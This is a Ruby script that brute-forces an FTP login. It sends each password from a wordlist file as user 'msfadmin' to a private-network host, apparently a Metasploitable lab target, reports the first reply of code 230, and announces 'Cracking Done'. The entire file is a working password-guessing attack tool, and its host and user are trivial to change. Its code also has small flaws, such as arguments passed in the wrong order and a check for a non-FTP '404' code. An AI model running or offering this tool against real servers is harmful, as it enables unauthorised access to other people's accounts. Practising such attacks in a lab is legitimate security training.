#!/usr/bin/ruby

require "socket"

def ftp_check(host, user, passwd)
	$conn = TCPSocket.new($host, 21)
	$banner = $conn.gets
	$conn.puts("USER #{$user}")
	$banner = $conn.gets
	$conn.puts("PASS #{$passwd}")
	$banner = $conn.gets
	$conn.puts("QUIT")
	$conn.close
	return $banner
end


$host = "192.168.83.128"
$user = "msfadmin"
$file_name = "pass.txt"
$file_obj = File.new($file_name, "r")

$file_obj.each do |line|
	$passwd = line.delete!("\n")
	$login = ftp_check($user, $passwd, $host)
	$resp = $login.to_s
	if $resp.include? "230" then
		puts "[+] Login successful: #{$user} : #{$passwd}"
		break
	elsif $resp.include? "530" then
		puts "[-] Login failed: #{$passwd}"
	elsif $resp.include? "404" then
		puts "[*] Connection refused by remote host"
	end
end
puts "Cracking Done at #{Time.now}"



#$bann = ftp_check($host, $user, $pass)
#